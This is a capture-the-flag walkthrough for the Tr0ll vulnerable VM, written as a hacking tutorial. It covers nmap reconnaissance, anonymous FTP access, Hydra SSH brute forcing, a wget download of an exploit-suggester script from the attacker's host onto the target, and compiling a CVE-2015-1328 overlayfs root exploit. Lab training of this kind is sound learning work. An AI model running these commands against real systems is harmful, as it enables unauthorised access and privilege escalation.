# CTF #3 - Tr0ll
Today we are hacking into Tr0ll - a boot-to-root vulnerable machine. It's not a hard machine to hack into but it's a good one to learn new stuff and let the previous knowledge sink in.

As always, let's start with my setup:
## My Setup
- A VirtualBox VM running **Kali Linux.** 
- Another VM running **Tr0ll.** You can download it **[here.](https://www.vulnhub.com/entry/tr0ll-1,100/)** 
- A **local network** for both machines. If you want to know how to set up a local network for your VirtualBox adventures, follow [**this simple tutorial.**](https://github.com/amtzespinosa/secure-network-for-ctf)
- Coffee. You always need coffee for hacking.
- And today, to season this CTF session... Let's play [**Megadeth - Rust in Peace.**](https://www.youtube.com/watch?v=xvfU5MGyI7k&ab_channel=TheRockChannel)

Now you are all set up and ready to go!


## Recon

I always like to run a fast/aggressive scan over the network with **Nmap.** To do so, I use this command:

    sudo nmap -sV -T4 192.168.1.1/24

*192.168.1.1/24 is my local network --- yours might be different. Check it with the command* `ip a`.

> **Note:** In real world situations, this scans may trigger firewalls and other network security appliances (in case the network is secure). If you want to run a softer scan, just change `-sV` to `-sS`. Once you know the open ports, you can target them individually. Change `-T4` (speed 4) to `-T1` (slow speed, will take ages) as well. It's not undetectable but less probable.

After getting the victim's IP, I like to run another scan. This time a more **thorough and focused scan** with the command:

    sudo nmap -p- -T4 -A -O -v 192.168.1.12

This way, we get more information about the victim. Let's have a look:

    Nmap scan report for 192.168.1.12
    Host is up (0.00024s latency).
    Not shown: 65532 closed tcp ports (reset)
    
    PORT   STATE SERVICE VERSION
    
    21/tcp open  ftp     vsftpd 3.0.2
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to 192.168.1.23
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 600
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 2
    |      vsFTPd 3.0.2 - secure, fast, stable
    |_End of status
    
    22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   1024 d618d9ef75d31c29be14b52b1854a9c0 (DSA)
    |   2048 ee8c64874439538c24fe9d39a9adeadb (RSA)
    |   256 0e66e650cf563b9c678b5f56caae6bf4 (ECDSA)
    |_  256 b28be2465ceffddc72f7107e045f2585 (ED25519)
    
    80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: Site doesn't have a title (text/html).
    | http-robots.txt: 1 disallowed entry 
    |_/secret
    |_http-server-header: Apache/2.4.7 (Ubuntu)
    
    MAC Address: 08:00:27:2E:C5:50 (Oracle VirtualBox virtual NIC)
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Uptime guess: 0.004 days (since Sun Apr 16 13:14:44 2023)
    Network Distance: 1 hop
    TCP Sequence Prediction: Difficulty=258 (Good luck!)
    IP ID Sequence Generation: All zeros
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Ok, now we know that ports 21 **(FTP)**, 22 **(SSH)** and 80 **(HTTP)** are open. As we can see, anonymous login is allowed for an FTP directory. Let's log in and see what we have:

    ftp 192.168.1.12

> **USER:** anonymous 
> 
> **PASS:**

 

And now we can list the files. `ls` and we can see a `lol.pcap` file. This files are the output files of sniffing tools like **Wireshark**. Let's download it and have a look.

    get lol.pcap
   
By default it will be saved in your kali folder. Right click and "Open with Wireshark". If we analyze it, we find a message: 

    Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P\n
    \n
    Sucks, you were so close... gotta TRY HARDER!\n

Isn't it obvious? Let's open Firefox and look for:

    http://192.168.1.12/sup3rs3cr3tdirlol/

And there we go! We found the **/sup3rs3cr3tdirlol**. Here we can find a file we should download. To see what the file contains we can use `strings` command.

    strings roflmao

And we get an output. But the interesting thing of this output is this line: 

**Find address 0x0856BF to proceed**

Another directory? Hell yeah!

    http://192.168.1.12/0x0856BF/

More files. This time looks like we get a usernames list and a Pass.txt. Let's try some **SSH** bruteforcing with **Hydra.** 

> **Note:** After a few tries... I realized that the password wasn't the lines contained in the Pass.txt but Pass.txt itself!

    sudo hydra -L users.txt -p Pass.txt ssh://192.168.1.12 

Note I have made a new text document with the usernames. And quickly we find a valid combination:

> **USER:** overflow
> 
> **PASS:** Pass.txt

Let's connect via **SSH**! Ok, now we're into the system! Let's start enumerating and deciding the way to escalate privileges but first:

    /bin/bash -i

Oh yeah! Much better. But be careful: we are againts the clock! 

## Enumeration
Once inside, the way I use to enumerate possible ways for **PrivEsc** is by getting into the `tmp` folder and downloading the Linux Exploit Suggester script into the victim's machine and running it. This way I can see my possibilities. To do this, paste the script into your `/var/www/html` folder. Once you have it:

    sudo service apache2 start

Now, in **troll** machine, inside `tmp` folder:

    wget http://192.168.1.23/les.sh

> **Note:** this should be your local IP. Mine is 192.168.1.23.

Now we should give permissions to the file:

    chmod 777 les.sh

And run it:

    ./les.sh

Now we know that this machine is specifically vulnerable to:

    [+] [CVE-2015-1328] overlayfs
    
       Details: http://seclists.org/oss-sec/2015/q2/717
       Exposure: highly probable
       Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
       Download URL: https://www.exploit-db.com/download/37292

I'm leaving you both files for downloading: les.sh and the folder containing the CVE-2015-1328. Once again, we just need to upload to **troll** the exploit as we did with the les.sh script. Once you have it, we are ready to go!

## Exploitation

To compile the exploit we need to run this command:

    gcc 2015.c -o exploit

And give permissions to the output file:

    chmod 777 exploit

Now, run it!

    ./exploit

And we should see a root shell now!

    #

Change to the `root` directory and there youll find **proof.txt**. You made it! And that's it for this machine. Happy hacking!
